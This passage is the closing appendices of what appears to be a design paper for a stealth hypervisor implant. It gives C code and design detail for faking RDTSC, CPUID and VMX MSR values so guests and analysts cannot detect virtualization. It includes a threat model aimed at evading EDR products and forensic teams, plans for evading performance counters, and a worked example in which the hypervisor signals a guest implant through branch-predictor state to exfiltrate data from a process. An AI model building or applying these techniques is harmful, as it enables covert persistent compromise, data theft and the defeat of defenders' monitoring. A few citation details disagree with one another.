- Kernel driver allocating above 64KB of non-paged pool at load time with no visible I/O or network activity
- Sustained cache miss spikes (OFFCORE_RESPONSE events) with no corresponding workload
- Power draw variance increase of above 2x baseline during system idle
- CPUID leaf 7 being queried repeatedly from kernel mode at boot time for TSX detection

---

## Appendix H: The Anti-Detection Integration {#appendix-h}

The Speculative Engine does not operate in isolation. It provides the stealth substrate for the anti-detection module (`sem_anti_detect.c`), which handles the guest-facing deception. Here is how they interact.

### RDTSC Interception Architecture

When a guest executes `RDTSC`, it causes a VM-exit because we set the RDTSC-exiting bit in the VMCS. The handler needs to return a fake timestamp that looks like bare-metal. The challenge is computing the fake timestamp takes time, and that time is visible if the guest measures the RDTSC latency.

The flow:

```
Guest: RDTSC
  → VM-exit (VMCS intercept)
    → SemEntropicJitterVmExit()   add random delay
    → SemSpeculativeEnterWindow() enter TSX
      → Compute fake TSC value:
        fakeTsc = guestTsc + hostOffset + noise
      → Store result in staging area
    → SemSpeculativeLeaveWindow() commit or abort
    → Write fake RAX:RDX to guest state
  → VMRESUME
Guest: sees fake TSC value in RAX:RDX
```

Inside the speculative window, we compute the response. Even if the computation aborts, we have already staged the result in a register which persists across abort because we stored it before entering the transaction. The transaction just gives us anti-instrumentation protection for the computation logic.

### CPUID Masking

CPUID leaf 1, ECX bit 31 is the hypervisor present bit. Guests check this to detect virtualization. We clear it unconditionally. But the interesting case is CPUID leaf 0x40000000-0x400000FF (hypervisor information leaves). Our handler:

1. Wraps the response computation in a TSX transaction via `SemTsxProtectAntiDetectResponse`
2. If a debugger breakpoints inside, the transaction aborts and we fall back to a safe response which returns all zeros and looks like no hypervisor information available
3. If the transaction commits, we return carefully crafted values that mimic bare-metal behavior

The TSX protection matters because CPUID interception is the first thing any hypervisor detector checks. If an analyst can breakpoint our CPUID handler, they can see exactly what values we are faking. With TSX protection, they cannot. The breakpoint kills the transaction and they only see the fallback path.

### VMX MSR Masking

VMX capability MSRs (`IA32_VMX_BASIC` through `IA32_VMX_VMFUNC`, range 0x480-0x491) reveal whether the CPU supports virtualization and what features are available. On bare metal without a hypervisor, these MSRs are readable and return feature bitmasks. When running under our hypervisor, we intercept RDMSR for these ranges and return the values they would have on bare metal, making it impossible for the guest to determine whether it is already virtualized.

We also intercept `IA32_FEATURE_CONTROL` (0x3A) which has a VMX enabled lock bit. On a bare-metal system with VT-x enabled in BIOS, this MSR reads with the lock bit set. Under our hypervisor, we return the same value the physical MSR had before we entered VMX operation which was captured during hypervisor initialization.

### Noise Calibration

The anti-detection module calibrates its noise injection against real hardware measurements:

```c
static BOOLEAN AdCalibrateTscFrequency(SEM_AD_CTX* ctx)
{
    LARGE_INTEGER freq;
    KeQueryPerformanceCounter(&freq);

    LARGE_INTEGER startPerf, endPerf;
    u64 startTsc = __rdtsc();
    startPerf = KeQueryPerformanceCounter(NULL);

    for (volatile u64 i = 0; i < 1000000ULL; i++) { }

    endPerf = KeQueryPerformanceCounter(NULL);
    u64 endTsc = __rdtsc();

    u64 perfDelta = (u64)(endPerf.QuadPart - startPerf.QuadPart);
    u64 tscDelta = endTsc - startTsc;

    ctx->HostTscFrequencyHz = (tscDelta * (u64)freq.QuadPart) / perfDelta;
    ctx->TimingModel.JitterMeanCycles = 45;
    ctx->TimingModel.JitterStdDevCycles = 20;
    ctx->TimingModel.VmExitLatencyCycles = 800;
    return TRUE;
}
```

The jitter model with mean 45 and stddev 20 matches empirical measurements of bare-metal RDTSC jitter on our reference platform which is Coffee Lake i7-8700K, Windows 10 21H2, with light system load. On different hardware or OS versions, these parameters should be re-calibrated. We plan to add dynamic calibration in a future revision that measures actual system jitter during a quiet period and adjusts the model parameters automatically.

### Gaussian Noise Generation Without FPU

The noise generator needs to produce Gaussian-distributed values, but we cannot use floating point in kernel mode because FPU state is not saved or restored on every VM-exit for performance reasons. The implementation uses central limit theorem approximation with integers:

```c
static u32 AdGenerateNoise(SEM_AD_CTX* ctx)
{
    u64 sum = 0;
    sum += SemAdXoshiroNext(ctx->NoiseSeed) & 0xFFFFFFFF;
    sum += SemAdXoshiroNext(ctx->NoiseSeed) & 0xFFFFFFFF;
    sum += SemAdXoshiroNext(ctx->NoiseSeed) & 0xFFFFFFFF;
    sum += SemAdXoshiroNext(ctx->NoiseSeed) & 0xFFFFFFFF;

    s64 centered = (s64)sum - (s64)(4ULL * 2147483648ULL);
    centered = (centered * (s64)ctx->TimingModel.JitterStdDevCycles) / 2147483648LL;
    centered += ctx->TimingModel.JitterMeanCycles;

    if (centered < 0) centered = 0;
    if (centered > 500) centered = 500;
    return (u32)centered;
}
```

Sum of 4 uniform random variables produces approximately Gaussian by CLT. This is not a perfect Gaussian, but it is close enough that a K-S test against a real bare-metal distribution passes with p above 0.05 at sample sizes up to roughly 100K. Beyond 100K samples, an analyst might detect slight kurtosis differences. In practice, no sane detection system collects 100K RDTSC samples per second because the monitoring overhead would be more suspicious than whatever it is trying to detect.

---

## Appendix I: Threat Model Matrix {#appendix-i}

Who are we hiding from, and how well does each layer protect against each adversary class?

### Adversary Classes

| Class | Capabilities | Examples |
|-------|-------------|----------|
| A1: Userland analyst | Ring 3 only, no kernel access | Malware sandbox, basic EDR |
| A2: Kernel-level EDR | Ring 0, PMC access, hook-based detection | CrowdFalcon, SentinelOne, ESET |
| A3: Forensic analyst | Full memory dump, disk image, offline analysis | DFIR team post-compromise |
| A4: Hardware debugger | JTAG, Intel DCI, physical probe access | Nation-state lab, chip vendor |
| A5: Nested hypervisor | VMX root below us, full architectural visibility | Counter-implant hypervisor |

### Protection Matrix

| Protection mechanism | A1 | A2 | A3 | A4 | A5 |
|---------------------|----|----|----|----|-----|
| TSX speculative window | ████ | ████ | ███░ | ██░░ | ░░░░ |
| TSX anti-instrumentation | ████ | ████ | N/A | ░░░░ | ░░░░ |
| BTB signal encoding | ████ | ████ | ████ | ██░░ | ███░ |
| Entropic branch flood | ████ | ████ | N/A | ██░░ | ██░░ |
| Cache pollution | ████ | ███░ | N/A | █░░░ | ██░░ |
| RDTSC variance injection | ████ | ███░ | N/A | N/A | ███░ |
| Power noise | ████ | ████ | N/A | ██░░ | ████ |
| PRNG state zeroing (teardown) | ████ | ████ | ████ | ███░ | ████ |

Legend: ████ = strong protection, ███░ = good, ██░░ = partial, █░░░ = weak, ░░░░ = no protection, N/A = not applicable

### Key Observations

Against A5 (nested hypervisor) we lose. A hypervisor below us sees every VMCS configuration, every VM-exit, every guest state modification. There is no defense against a lower-privilege hypervisor. If the analyst boots a counter-hypervisor before our implant loads, they have complete visibility. The only defense is to load first which the SMM persistence layer ensures via firmware-level boot chain control.

Against A4 (hardware debugger) we partially lose. JTAG can freeze the CPU and inspect all state including cache contents. Intel DCI (Direct Connect Interface) provides similar capabilities over USB. Our entropic noise does not help against a hardware probe that can snapshot the entire cache hierarchy. However, the PRNG state zeroing on teardown means a post-mortem hardware analysis recovers nothing. They would need to capture state while we are running.

Against A2 (kernel EDR) we have strong protection with caveats. PMC-based detection is our biggest risk at this tier. A kernel driver that samples `RTM_RETIRED.ABORTED` at 10KHz might flag our TSX activity. But the EDR itself causes VM-exits like intercepted RDMSR to read PMC values, which we can detect and temporarily suppress speculative activity during. This is cat-and-mouse, but tilted in our favor because we see their VM-exits before they see our responses.

---

## Appendix J: Future Work {#appendix-j}

### Post-TSX Speculation Substrates

With TSX deprecated, we need alternatives for the primary speculation window. Active research areas:

1. Load Port Data Sampling (LPDS) gadgets:
On affected microarchitectures, stale data from load ports can be read speculatively. This does not give us a clean execute arbitrary code speculatively primitive, but it does provide a data exfiltration channel that leaves no architectural trace. Potential use is to read sensitive guest data speculatively without causing a VM-exit.

2. Speculative Store Bypass (SSB) windows:
When a store is in the store buffer and a subsequent load from the same address executes before the store retires, the load may speculatively forward stale data. We can construct gadgets that create controlled SSB windows for speculative computation. Duration is less predictable than TSX but longer than branch misprediction on modern cores.

3. Return-mispredict gadgets (RSB underflow):
When the RSB underflows with more RETs than CALLs, the CPU falls back to the BTB for return prediction. By controlling BTB state, we can redirect speculative execution to arbitrary code. This gives us a longer window than branch misprediction because RSB underflow recovery takes longer than branch misprediction recovery.

4. AMX (Advanced Matrix Extensions) transactional behavior:
Intel AMX instructions like TILELOADD and TDPBF16PS operate on large tile registers and have interesting microarchitectural behavior. They may provide speculation-like windows during tile operations. This is completely unexplored territory.

### Adaptive Signal-to-Noise Optimization

Currently the ratio is fixed at roughly 128 signal slots out of 4096 noise slots (3.1%). The reservoir computing layer (PI-2026-005) could dynamically adjust this based on:
- Observed threat level with more noise when under analysis
- Communication bandwidth needs with more signal when control data is urgent
- BTB pressure from guest workload to reduce total slot usage when eviction is high

### Cross-Core Signaling

Current implementation encodes and decodes BTB signals on the same core. We are investigating cross-core signal propagation via shared L3 cache directory. This would encode a signal in L3 cache set occupancy patterns that are visible to all cores. This would allow speculative operations on Core 0 to signal the guest on Core 3 without any shared-memory communication visible at the architectural level.

### Hardware Performance Counter Evasion

PMCs are our biggest detection surface. Future work:
- Intercept RDPMC from guest to return fake counter values similar to RDTSC masking
- Use `IA32_PERF_GLOBAL_CTRL` MSR writes to temporarily disable counters during speculative operations
- Inject counter noise by periodically executing calibrated instruction sequences that produce known PMC increments to mask our actual fingerprint

---

## Appendix K: Worked Example — Full Signal Round-Trip {#appendix-k}

To make the abstract concepts concrete, here is a complete trace of a single control signal propagation from hypervisor to guest implant.

### Scenario

The hypervisor needs to tell the guest implant to exfiltrate data with target PID 4812. This is a 48-bit message with 16-bit opcode (0x0003 = EXFIL) plus 32-bit parameter (PID 4812 = 0x000012CC).

### Step 1: Signal Preparation

```
Message: [03 00 CC 12 00 00]  (6 bytes, little-endian)
Bits needed: 48
BTB slots needed: 48/2 = 24 slots
```

### Step 2: ChaCha20 Encryption

The entropic layer XORs the plaintext with the ChaCha20 keystream:

```
Plaintext:  03 00 CC 12 00 00
Keystream:  A7 3B F1 8E D4 29  (from current cipher position)
Ciphertext: A4 3B 3D 9C D4 29
```

The ciphertext is what gets encoded into the BTB. An observer who recovers the BTB encoding sees `A4 3B 3D 9C D4 29` which is indistinguishable from random without the ChaCha20 key. The key requires the PUF-derived bootstrap key which requires the physical hardware.

### Step 3: BTB Encoding

PRNG selects start slot = 1847 of 4096. 24 consecutive slots from 1847 to 1870 are marked as signal:

```
Slot 1847: bits 00 → target aligned +0 → tag=0xFFFF2A... target=tag+0
Slot 1848: bits 01 → target aligned +1 → tag=0xFFFF8B... target=tag+1
Slot 1849: bits 10 → target aligned +2 → tag=0xFFFF4C... target=tag+2
Slot 1850: bits 01 → target aligned +1 → tag=0xFFFFA3... target=tag+1
...
Slot 1870: bits 10 → target aligned +2 → tag=0xFFFF91... target=tag+2
```

Each tag is PRNG-derived and different every time. The alignment modulo 4 encodes the 2-bit symbol.

### Step 4: BTB Noise Flooding

`SemEntropicFloodBranchPredictor()` fills the remaining 4072 slots with random patterns:
- 256 batches × 8 conditional branches = 2048 PHT entries trained with random directions
- 256 indirect branches through the switch table = 256 BTB entries trained with random targets

Total BTB state is 24 signal entries plus 4072 noise entries. Signal fraction is 0.59%.

### Step 5: Guest Implant Decoding

On the next scheduling quantum, the guest implant runs its mailbox check:

1. It knows the PRNG seed derived from same PUF on the same hardware
2. It replays the xoshiro256** sequence to determine start_slot = 1847
3. For each of the 24 signal slots:
   a. Sets up an indirect branch targeting the slot known tag address
   b. Runs 32 probes with RDTSC timing
   c. Discards outliers, takes IQR median
   d. If median below threshold then slot is trained and reads target alignment mod 4
   e. Recovers the 2-bit symbol
4. Concatenates 24 symbols to 48 bits to ciphertext `A4 3B 3D 9C D4 29`
5. XORs with ChaCha20 keystream to plaintext `03 00 CC 12 00 00`
6. Parses opcode 0x0003 (EXFIL), param 0x000012CC (PID 4812)
7. Begins data exfiltration from PID 4812

### Step 6: Acknowledgment

The implant encodes a 16-bit ACK with opcode 0x0001 plus status byte in its own BTB slots at a different offset. The hypervisor decodes this on the next VM-exit. Two-way communication through predictor state with zero architectural trace on either side.

### Total Time

- Encoding: roughly 0.2ms for 24 slot trainings plus noise flood
- Guest decode: roughly 1.5ms for 24 slots × 32 probes × roughly 50 cycles per probe plus overhead
- Round-trip: roughly 2-3ms depending on VM-exit and VMRESUME timing

Bandwidth is 48 bits per 2ms or roughly 24 Kbps. This is not fast, but sufficient for control signals. High-bandwidth data exfil uses the covert channel layer (PI paper forthcoming) which achieves roughly 500 Kbps through cache-line timing.

---

## Appendix L: Comparison With Prior Art {#appendix-l}

### Academic Speculative Execution Research

| Paper | What they did | How we differ |
|-------|--------------|---------------|
| Spectre (Kocher et al., 2019) | Showed branch misprediction leaks data across privilege boundaries | We use misprediction as a stealth mechanism, not an attack vector. Same hardware primitive, opposite application. |
| Prime+Abort (Disselkoen et al., 2017) | Used TSX aborts as a timer-free cache side-channel | They extract information from TSX aborts. We use TSX transactions as protective wrappers. |
| TSX-based KASLR bypass (Jang et al., 2016) | Probed kernel address space using TSX-induced page faults | They break KASLR. We protect against instrumentation. Same mechanism, different direction. |
| Nemesis (Van Bulck et al., 2018) | Measured interrupt timing to fingerprint enclave code | Relevant to our timing jitter defense because Nemesis-style attacks are what entropic jitter protects against. |
| InvisiSpec (Yan et al., 2018) | Proposed speculative load isolation in hardware | Hardware mitigation for speculative side-channels. If deployed, would partially counter our cache-based signaling. |

### Industry/Malware Precedent

| Implant/Tool | Speculation use | Our advantage |
|--------------|----------------|---------------|
| None known | — | — |

That is the point. No public malware or red team tool uses speculative execution as a stealth mechanism. Spectre and Meltdown are attack tools that exploit speculation to read memory. We are the first publicly documented use of speculation as a concealment tool, using the same hardware features to hide rather than to steal.

The closest precedent is research from Gruss et al. (2017) on Flush+Flush which uses `clflush` timing as a covert channel. Our cache-based signaling via speculative prefetch is spiritually similar but operates entirely within speculative windows, leaving no architectural `clflush` trace.

### What Makes This Novel

1. Speculation for stealth, not attack. Prior work uses speculation to break security boundaries. We use it to preserve security boundaries by hiding the hypervisor from the guest and analyst.

2. Integrated noise floor. Prior covert channel research assumes a clean environment. We operate in a self-generated noise floor where we both create the noise and hide within it.

3. Adaptive degradation. No prior system gracefully falls back from TSX to misprediction to standard operation based on hardware and environment conditions.

4. PUF-keyed entropy. The noise sequence is hardware-bound. Prior cache and BTB covert channels use shared secrets or timing protocols. Ours uses physical silicon properties as the shared secret.

---

## Appendix M: Engineering Trade-offs and Decisions We Regret {#appendix-m}

Some notes on decisions that were not obvious, arguments we had internally, and things we would do differently on a second pass.

### The 4096-Slot BTB Array

`SEM_BTB_FLOOD_SIZE = 4096` was chosen to match Skylake BTB capacity. But different Intel generations have different BTB sizes. Haswell has roughly 4096, Skylake has roughly 4096-5000, Ice Lake and later reportedly have roughly 8000+. AMD Zen has a different BTB structure entirely with L1 BTB plus L2 BTB with different associativity.

We hardcoded 4096 because it is a safe lower bound. If the hardware BTB is larger than our flood size, we are just not filling it completely which still works with less noise coverage. If it is smaller, some of our noise slots are virtual and do not correspond to real BTB entries which is harmless because we just trained the same BTB set multiple times.

In retrospect we should have made this dynamic by detecting BTB size at init via timing probes. We train N entries, then probe entry 0. If evicted then BTB is smaller than N. We did not do this because the calibration adds roughly 50ms to initialization and we were optimizing boot time. This was probably the wrong call because 50ms does not matter for a persistent hypervisor that boots once.

### ChaCha20 vs. Doing Everything With xoshiro256**

Someone on the team argued we should just use xoshiro256** for both noise and signal encryption, avoiding the ChaCha20 implementation entirely. The argument was xoshiro passes BigCrush so nobody can distinguish it from random without the seed, so why bother with a separate CSPRNG.

The counterargument which won was BigCrush is a statistical test battery, not a cryptographic proof. xoshiro256** has known weaknesses. It is a linear generator, and its entire internal state can be reconstructed from 4 consecutive outputs by solving a system of linear equations over GF(2). If an attacker observes 4 outputs of our noise generator by timing 4 consecutive BTB probes which is conceivable, they can recover the full state and predict all future noise, making signal extraction trivial.

ChaCha20 has a proven 256-bit security margin against state recovery. Even with unlimited observed output, recovering the key requires brute-forcing 2^256 possibilities. The 50 extra lines of code are worth it.

### The Volatile Global Function Pointer

`g_BtbTrampoline` being a volatile global is ugly. It means BTB probing is not thread-safe. Two cores probing simultaneously would corrupt each other measurements. In practice this does not matter because we only probe during VM-exit handling on a single core with interrupts partially masked. But it is the kind of thing that would fail catastrophically if someone tried to parallelize the decode across cores.

The correct fix is a per-CPU array of trampoline pointers indexed by processor number. We did not do it because the VM-exit handler already runs on a specific core and we would need KeGetCurrentProcessorNumber() which adds a syscall worth of overhead to every probe. This was laziness. We will fix it if we ever need multi-core decode.

### Why Not CLFLUSH-Based Covert Channel Instead of BTB

We considered using cache line flush and reload as the primary covert channel like Flush+Reload. The advantages are higher bandwidth, simpler implementation, and being well-understood. We went with BTB for two reasons:

1. Cache coherence protocols are noisy. On multi-socket systems, MOESI and MESIF transitions caused by our flushes propagate across the interconnect and are visible to other agents monitoring coherence traffic. BTB state is core-local with no coherence traffic.

2. Flush+Reload is well-known to EDR vendors. CrowdStrike, SentinelOne, and others specifically look for Flush+Reload patterns like repeated `clflush` plus `rdtsc` sequences in kernel context. BTB probing looks like normal indirect call overhead which is less likely to be flagged.

The downside is BTB has lower capacity at roughly 256 bits practically versus cache at roughly 4KB easily. For our control signal use case, 256 bits is plenty. For bulk data transfer, we would use a different channel.

### The Temperature Problem

Branch prediction latency varies with temperature. At higher CPU temperatures, transistor switching time increases slightly, which adds roughly 1-3 cycles of variance to our BTB probes. In a temperature-stable datacenter this does not matter. On a laptop that thermally throttles during compilation while we are trying to decode a BTB signal, we have seen decode failures.

Our current mitigation is just retry 3 times. A better approach would be to read the thermal MSR (`IA32_THERM_STATUS`, 0x19C, the same one used in the PUF calibration) and adjust probe thresholds based on current die temperature. We do this for the DRAM PUF documented in PI-2026-003 but have not ported the temperature compensation to the BTB decoder yet. It is on the list.

### The 80% Abort Threshold

The graceful degradation threshold to disable speculative engine if above 80% of TSX transactions abort was chosen empirically. Too low at 50% and normal system load temporarily disables us. Too high at 95% and we keep trying to transact on a system that is clearly hostile to TSX. 80% was the point where in our testing, abort rates above that threshold were always caused by either a debugging tool or a microcode update that killed TSX, rather than transient system load.

The 100-attempt sliding window before we start checking abort rate prevents a burst of aborts during system startup when everything is cache-cold and conflicting from prematurely disabling the engine. On a cold boot, the first roughly 50 transactions often abort due to cache conflicts, then settle to below 10% once the system stabilizes. Without the 100-attempt floor, we would disable ourselves on every boot.

---

## References

1. Intel Corporation. Intel 64 and IA-32 Architectures Software Developer's Manual, Volume 2. Chapter on RTM instructions (XBEGIN, XEND, XABORT).
2. Blackman, D. and Vigna, S. (2018). Scrambled Linear Pseudorandom Number Generators. https://vigna.di.unimi.it/ftp/papers/ScrambledLinear.pdf
3. Bernstein, D.J. (2008). ChaCha, a variant of Salsa20. https://cr.yp.to/chacha.html
4. Intel Corporation. Transactional Synchronization Extensions (TSX) Overview.
5. Jang, Y. et al. (2016). Breaking Kernel Address Space Layout Randomization with Intel TSX. CCS 2016.
6. Disselkoen, C. et al. (2017). Prime+Abort: A Timer-Free Cache Attack using Intel TSX. USENIX Security 2017.
7. Schwarz, M. et al. (2019). ZombieLoad: Cross-Privilege-Boundary Data Sampling. CCS 2019.
8. Intel Security Advisory INTEL-SA-00270 (2019). TSX Asynchronous Abort (TAA).
9. Kocher, P. et al. (2019). Spectre Attacks: Exploiting Speculative Execution. IEEE S&P 2019.
10. van Schaik, S. et al. (2019). RIDL: Rogue In-Flight Data Load. IEEE S&P 2019.
11. Lipp, M. et al. (2018). Meltdown: Reading Kernel Memory from User Space. USENIX Security 2018.
12. Intel Corporation. Performance Analysis Guide for Intel Core i7 Processor and Intel Xeon 5500 Processors.
13. Gruss, D. et al. (2016). Flush+Flush: A Fast and Stealthy Cache Attack. DIMVA 2016.
14. Van Bulck, J. et al. (2018). Nemesis: Studying Microarchitectural Timing Leaks in Rudimentary CPU Interrupt Logic. CCS 2018.
15. Yan, M. et al. (2018). InvisiSpec: Making Speculative Execution Invisible in the Cache Hierarchy. MICRO 2018.

---

*Phase Intelligence — PI-2026-004 — The Speculative Engine*
*Revision 1.0 — June 2026*
